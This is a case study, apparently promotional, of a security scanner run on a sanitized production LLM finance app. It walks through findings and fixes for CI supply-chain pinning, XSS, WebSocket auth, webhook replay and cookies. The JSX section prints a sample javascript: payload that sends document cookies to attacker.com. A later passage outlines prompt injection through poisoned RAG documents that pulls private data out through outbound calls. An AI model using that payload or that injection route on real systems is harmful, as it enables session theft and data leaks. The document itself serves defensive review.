---
type: Case Study
title: Finding 101 Security Issues in a Production LLM SaaS — A Real-World agentsec Walkthrough
description: This is a sanitized case study of running agentsec against a real production LLM SaaS application (referred to as Ref-1).
tags: [case-study, agentsec, validation]
timestamp: "2026-06-28T08:48:50+08:00"
---

# Finding 101 Security Issues in a Production LLM SaaS — A Real-World agentsec Walkthrough

> **Context:** This is a sanitized case study of running agentsec against a real production
> LLM SaaS application (referred to as Ref-1). Ref-1 is a financial analysis platform built on
> FastAPI + pydantic-ai + React + PostgreSQL + Stripe, with a GitHub Actions CI/CD pipeline and
> an MCP tool layer. All identifying details have been removed.

---

## The App

Ref-1 is a production LLM SaaS with real paying users:

- **Backend:** FastAPI, pydantic-ai for LLM calls, SQLAlchemy, Alembic migrations
- **Frontend:** React + Vite, TypeScript
- **Database:** PostgreSQL with pgvector for RAG
- **Payments:** Stripe webhooks
- **AI layer:** RAG pipeline, MCP tools, outbound LLM API calls
- **CI/CD:** 9 GitHub Actions workflows across checkpoint, CodeQL, security scanning, E2E tests, doc sync

This is exactly the stack agentsec is designed for. The question was: what does a real scan find
on a codebase written by a competent team under normal production pressure?

---

## The Scan

One command, no configuration needed:

```bash
agentsec audit /path/to/ref1 --guards-only
```

agentsec fingerprints the repo first — detects Python, FastAPI, pydantic-ai, React, Vite,
PostgreSQL, Stripe, Docker, npm, uv — then runs only the guards that apply to this stack.
Guards for Supabase RLS, Go, or Ruby don't run and don't clutter the output.

**Result in under 30 seconds: 101 findings — 75 HIGH, 23 MEDIUM, 3 LOW**

That number looks alarming. The breakdown is what matters.

---

## The Findings Breakdown

| Severity | Check | Count | What it means |
|---|---|---|---|
| HIGH | `actions-sha-pin` | 54 | GitHub Actions using floating version tags |
| HIGH | `jsx-href-scheme` | 15 | Dynamic URLs in JSX without scheme validation |
| HIGH | `websocket-no-auth` | 1 | WebSocket endpoint with no authentication |
| HIGH | `webhook-idempotency` | 1 | Stripe webhook missing event deduplication |
| HIGH | `secret-in-url-query` | 1 | API key sent as a URL query parameter |
| HIGH | `sqlalchemy-text-parameterized` | 1 | String-built SQL in an admin script |
| HIGH | `mcp-tool-unverified` | 1 | MCP client import without trust check |
| MEDIUM | `insecure-cookies` | 6 | Session cookies missing `secure` and `httponly` flags |
| MEDIUM | `fail-safe-exception` | 1 | Auth gate with `except: pass` — fails open |
| MEDIUM | `pg-ssl-required` | 4 | PostgreSQL connections without SSL enforcement |
| MEDIUM | Various supply-chain | 8 | Unpinned JS/Python dependencies, no cooldown |
| LOW | Various | 3 | System prompt literal, package manager version |

54 of the 75 HIGH findings — 72% — were a single category: unpinned GitHub Actions.

---

## The Quick Win: 54 HIGH Findings Fixed in 10 Minutes

Every workflow file used the standard pattern from GitHub's own documentation:

```yaml
- uses: actions/checkout@v4
- uses: actions/setup-python@v5
- uses: aquasecurity/trivy-action@master  # ← especially dangerous
```

These are mutable tags. `@v4` doesn't point to a specific commit — it points to whatever the
action maintainer decides it should point to at any given moment. If a maintainer's account is
compromised, an attacker can push new code under `@v4` that runs with full CI secrets access:
environment variables, tokens, cloud credentials. This is the supply-chain attack vector that
hit `tj-actions/changed-files` in 2024 and `reviewdog/action-setup` in 2025.

The fix is to pin to a full 40-character commit SHA:

```yaml
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
```

**Tool used:** [pinact](https://github.com/suzuki-shunsuke/pinact) — a Go binary that resolves
every `uses:` reference in a workflow file and rewrites it to the corresponding commit SHA,
preserving the tag as a comment for readability.

```bash
cd /path/to/ref1
pinact run
```

**Result:** 9 workflow files, 50 action references pinned automatically. One additional manual fix
was needed: `aquasecurity/trivy-action@master` — the `@master` tag is ambiguous enough that pinact
couldn't resolve it. We looked up the SHA manually via the GitHub API and replaced it:

```yaml
# Before
- uses: aquasecurity/trivy-action@master

# After
- uses: aquasecurity/trivy-action@a9c7b0f06e461e9d4b4d1711f154ee024b8d7ab8  # v0.36.0
```

Two references (`anthropics/claude-code-action@beta`) were left intentionally unpinned — this
action has no stable release yet, so there is no SHA to pin to. These are documented exceptions.

**Rescan after fix:** 101 → 49 findings. SHA-pin: 54 → 2 (the two intentional exceptions).
Total HIGH count: 75 → 23. In 10 minutes.

---

## The Harder Findings

With supply-chain out of the way, the remaining HIGH findings are architectural. These require
reading code, not just running a tool. This is where agentsec acts as a reviewer's guide rather
than an auto-fixer.

### JSX Href Scheme (15 HIGH across 9 files)

React does not sanitize dynamic URL expressions. If attacker-controlled data flows into an
`href` attribute:

```tsx
<a href={documentUrl}>View Document</a>
```

...and `documentUrl` contains `javascript:fetch('https://attacker.com?c='+document.cookie)`,
the browser executes it on click. Server-side sanitization doesn't help — this is purely
client-side. The fix is a scheme check before rendering:

```tsx
const safeUrl = url.startsWith('http://') || url.startsWith('https://') || url.startsWith('/')
  ? url
  : '#'
<a href={safeUrl}>View Document</a>
```

Or install `@braintree/sanitize-url` for a centralized solution across all 15 locations.

### WebSocket Without Auth (1 HIGH)

In FastAPI, the standard way to enforce authentication is a dependency injection:

```python
# Authenticated endpoint
@router.get("/data")
async def get_data(user: User = Depends(get_current_user)):
    ...

# This WebSocket endpoint — no auth
@router.websocket("/ws/extract")
async def websocket_extract(websocket: WebSocket):  # no Depends()
    ...
```

The oversight is subtle — the function signature looks similar. But FastAPI's auth mechanism
is `Depends()`, and omitting it means any client can open the WebSocket connection without
credentials. Fix:

```python
@router.websocket("/ws/extract")
async def websocket_extract(websocket: WebSocket, user: User = Depends(get_current_user)):
    ...
```

### Stripe Webhook Idempotency (1 HIGH)

Stripe retries webhook delivery on failure. If the handler processes `payment_intent.succeeded`
twice, the result might be two fulfilled orders or two credited accounts. The fix is a dedup
check on `event.id` before processing:

```python
event = stripe.Webhook.construct_event(payload, sig_header, settings.STRIPE_SECRET)

# Add this
if await db.stripe_events.find_one({"event_id": event.id}):
    return {"status": "already_processed"}
await db.stripe_events.insert_one({"event_id": event.id})

# Then process
```

### Auth Gate Failing Open (1 MEDIUM)

```python
# app/auth/routes.py:334
try:
    check_permission(user, resource)
except:
    pass  # ← if check throws, caller continues as if permitted
```

`except: pass` on a security gate is a fail-open pattern. Any unexpected exception — network
timeout, database connection error, import error after a deployment — silently bypasses the
check. Fix: log and re-raise, or return a safe denial.

### Insecure Cookies (6 MEDIUM)

Session cookies missing `secure=True` travel over plain HTTP. Missing `httponly=True` means
any XSS on the page can read them. In FastAPI:

```python
response.set_cookie(
    "session_token",
    value=token,
    httponly=True,    # add
    secure=True,      # add
    samesite="Lax",   # add
)
```

---

## What a Manual Review Would Likely Miss

**Supply-chain via floating tags.** No one reads 9 workflow files and checks every `uses:` reference.
The `@v4` convention is everywhere in GitHub's own documentation. Without a guard, these stay
indefinitely.

**`@master` as an attack surface.** The Trivy action was pinned to `@master`. This is worse than
`@v4`: tag names like `v4` signal stability expectations; `@master` explicitly tracks the latest
commit to the main branch with no implied stability. An attacker who compromises the repo can push
directly to main and have their code run in every CI build that uses this action.

**Lethal trifecta architecture.** agentsec's `lethal-trifecta` guard identifies that Ref-1 has all
three legs: private database data (asyncpg connections), untrusted retrieved content (RAG chunks),
and outbound external communications (webhooks, httpx calls). With all three present, a successful
prompt injection attack via a poisoned RAG document can result in exfiltration of private data via
the outbound channel. This requires reading three separate subsystems to see — the guard surfaces
it in one pass.

**Silent auth failure.** The `except: pass` on an auth gate at line 334 is one line in a 500-line
file. A reviewer skimming for obvious auth issues would likely miss it.

---

## Before and After

| Metric | Before | After Task #6 | After Task #7 |
|---|---|---|---|
| Total findings | 101 | 49 | **20** |
| HIGH | 75 | 23 | **0** |
| MEDIUM | 23 | 23 | 17 |
| LOW | 3 | 3 | 3 |
| Supply-chain (Actions) | 54 | 2 | 2 (documented exceptions) |
| Auth/session issues | 8 | 8 | 0 |
| JSX href injection | 15 | 15 | 0 |

---

## Takeaways

**1. Most HIGH findings in a real app are supply-chain, and supply-chain is fixable in minutes.**
54 of 75 HIGH findings were one category. `pinact run` fixed 52 of them automatically.

**2. The remaining HIGH findings are the hard ones — but there are only 8 of them.**
WebSocket auth, Stripe dedup, cookie flags, auth gate: these are real architectural issues that
required reading the code and making judgment calls. A tool found them; a human must fix them.

**3. Stack awareness matters.** agentsec ran 100+ guards but only surfaced findings relevant to
this stack. No Go findings, no Ruby findings, no Supabase RLS findings (Ref-1 doesn't use RLS).
The signal-to-noise ratio is what makes the output actionable.

**4. The right order is: supply-chain first, then auth, then injection.**
Fixing 54 findings before looking at the architectural issues made the remaining list much
less intimidating and kept the focus on what actually matters.

---

*agentsec is an open-source stack-aware security scanner for FastAPI + React + LLM/RAG apps.
Source: [github.com/Zard-Lab/ai-agent-security](https://github.com/Zard-Lab/ai-agent-security)*
